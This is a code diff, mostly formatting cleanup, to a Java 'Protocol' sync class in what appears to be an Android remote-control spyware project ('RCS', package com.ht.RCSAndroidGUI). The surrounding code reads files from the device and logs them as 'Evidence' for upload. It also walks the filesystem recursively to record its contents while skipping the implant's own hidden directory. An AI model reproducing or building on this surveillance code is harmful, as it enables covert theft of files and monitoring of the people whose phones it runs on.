@@ -15,10 +15,7 @@ package com.ht.RCSAndroidGUI.action.sync;
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
 
-import java.io.ByteArrayOutputStream;
-import java.io.DataOutputStream;
 import java.io.File;
-import java.io.IOException;
 import java.util.Date;
 import java.util.Vector;
 
@@ -26,7 +23,6 @@ import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.Evidence;
 import com.ht.RCSAndroidGUI.EvidenceType;
 import com.ht.RCSAndroidGUI.LogR;
-import com.ht.RCSAndroidGUI.agent.Agent;
 import com.ht.RCSAndroidGUI.conf.Configuration;
 import com.ht.RCSAndroidGUI.file.AutoFile;
 import com.ht.RCSAndroidGUI.file.Directory;
@@ -165,7 +161,7 @@ public abstract class Protocol {
 			// #ifdef DEBUG
 			debug.trace("logging file: " + filefilter);
 			// #endif
-			if(file.canRead()){
+			if (file.canRead()) {
 				saveFileLog(file, filefilter);
 			}
 		} else {
@@ -211,10 +207,10 @@ public abstract class Protocol {
 		final byte[] content = file.read();
 		final byte[] additional = Protocol.logDownloadAdditional(filename);
 		final Evidence log = new Evidence(0);
-		
+
 		new LogR(EvidenceType.DOWNLOAD, LogR.LOG_PRI_STD, additional, content);
-		
-		//log.atomicWriteOnce(additional, EvidenceType.DOWNLOAD, content);
+
+		// log.atomicWriteOnce(additional, EvidenceType.DOWNLOAD, content);
 
 	}
 
@@ -392,7 +388,7 @@ public abstract class Protocol {
 		// #ifdef DBC
 		Check.requires(fsLog != null, "fsLog null");
 		// #endif
-		byte[] content = new byte[30];
+		final byte[] content = new byte[30];
 
 		final DataBuffer databuffer = new DataBuffer(content);
 		databuffer.writeInt(version);
@@ -420,7 +416,8 @@ public abstract class Protocol {
 		// #ifdef DBC
 		Check.requires(depth > 0, "wrong recursion depth");
 		Check.requires(path != null, "path==null");
-		Check.requires(path=="/" || !path.endsWith("/"), "path should end with /");
+		Check.requires(path == "/" || !path.endsWith("/"),
+				"path should end with /");
 		Check.requires(!path.endsWith("*"), "path shouldn't end with *");
 		// #endif
 
@@ -428,15 +425,15 @@ public abstract class Protocol {
 		debug.trace("expandPath: " + path + " depth: " + depth);
 		// #endif
 
-		File dir = new File(path);
+		final File dir = new File(path);
 		if (dir.isDirectory()) {
-			String[] files = dir.list();
-			if(files==null){
+			final String[] files = dir.list();
+			if (files == null) {
 				return;
 			}
-			for (String file : files) {
+			for (final String file : files) {
 				String dPath = path + "/" + file;
-				if(dPath.startsWith("//")){
+				if (dPath.startsWith("//")) {
 					dPath = dPath.substring(1);
 				}
 				if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) {
@@ -446,7 +443,7 @@ public abstract class Protocol {
 					continue;
 				}
 
-				boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
+				final boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
 				if (isDir && depth > 1) {
 					expandPath(fsLog, dPath, depth - 1);
 				}
